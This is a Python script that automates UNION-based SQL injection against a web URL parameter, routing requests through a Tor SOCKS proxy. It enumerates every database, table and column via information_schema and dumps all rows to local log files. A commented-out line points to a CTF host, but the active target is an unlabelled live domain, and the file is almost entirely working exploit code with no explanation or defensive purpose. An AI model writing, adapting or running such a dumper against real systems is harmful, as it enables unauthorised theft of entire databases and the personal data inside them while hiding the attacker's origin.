import os
import requests, requesocks
import sys
import getopt
import ast

db_count	= "-1' union select count(schema_name),1,2 from information_schema.schemata union select 1,2,'3" 
db_fetch	= "-1' union select schema_name,1,2 from information_schema.schemata LIMIT %d,1 union select 1,2,'3"

table_count = "-1' union select count(table_name),1,2 from information_schema.tables where table_schema='%s' union select 1,2,'3"
table_fetch = "-1' union select table_name,1,2 from information_schema.tables where table_schema='%s' LIMIT %d,1 union select 1,2,'3"

column_count= "-1' union select count(column_name),1,2 from information_schema.columns where table_name='%s' union select 1,2,'3"
column_fetch= "-1' union select group_concat(column_name),1,2 from information_schema.columns where table_name='%s' union select 1,2,'3"

row_count	= "-1' union select count(*),1,2 from `%s`.`%s` union select 1,2,'3"
row_fetch	= "-1' union select %s,1,2 from `%s`.`%s` LIMIT %d,1 union select 1,2,'3"

proxy = {"http":"socks5://localhost:9050","https":"socks5://localhost:9050"}

url = 'http://1112211.com/3?a=%s'
#url = "http://ctf.0xdeffbeef.com/amq.php"

def getResult(uid):
	cUrl = url % uid
	print cUrl
	r = requesocks.post(cUrl, proxies=proxy)
	res = r.text.split('<html>')[0]
	print res
	return res
	
def getDBs():
	count = int(getResult(db_count))
	
	dbs = []
	for i in range(count):
		dbs.append(getResult(db_fetch % i))
	return dbs
	
def getTables(db):
	count = int(getResult(table_count % db))
	
	tbs = []
	for i in range(count):
		tbs.append(getResult(table_fetch % (db,i)))
	return tbs
	
def getColumns(tb):
	count = int(getResult(column_count % tb))
	cls = getResult(column_fetch % tb).split(',')
	return cls
	
	cls = []
	for i in range(count):
		cls.append(getResult(column_fetch % (tb,i)))
	print "|".join(cls)
	return cls
	
def getRows(db, tb, cols):
	count = int(getResult(row_count % (db,tb)))
	print count
	cur.write(str(count)+"\n")
	
	cur.write(u'|'.join(cols).encode('utf-8').strip())
	cur.write("|\n")
	
	rows = []
	for i in range(count):
		rows.append([])
		for col in cols:
			rows[i].append(getResult(row_fetch % (col,db,tb,i)))
		cur.write(u'|'.join(rows[i]).encode('utf-8').strip())
		print '|'.join(rows[i])
		cur.write("|\n")
		cur.flush()
	return rows

log = open('deli.log', 'w+')

dbs = []
if os.path.exists('dbs.log'):
	cur = open('dbs.log', 'r')
	n = int(cur.readline())
	for i in range(n):
		dbs.append(cur.readline()[:-1])
		print dbs[i]
	cur.close()
else:
	cur = open('dbs.log', 'w+')
	dbs = getDBs()
	cur.write(str(len(dbs))+"\n")
	for db in dbs:
		cur.write(db+"\n")
	cur.close()

if not os.path.exists('databases'):
	os.makedirs("databases")
if not os.path.exists('tables'):
	os.makedirs("tables")

for db in dbs:
	if db=="mysql" or db=="information_schema":
		continue
	log.write(db+"\n")
	log.flush()
	
	cur = open("databases/"+db+".log", 'w+')
	tbs = getTables(db)
	cur.write(str(len(tbs))+"\n")
	for tb in tbs:
		cur.write(tb+"\n")
	cur.close()
	
	for tb in tbs:
		log.write("\t"+tb+"\n")
		log.flush()
		
		cur = open("tables/"+db+"."+tb+".log", 'w+')
		
		cls = getColumns(tb)
		rows = getRows(db, tb, cls)
		cur.close()

log.close()
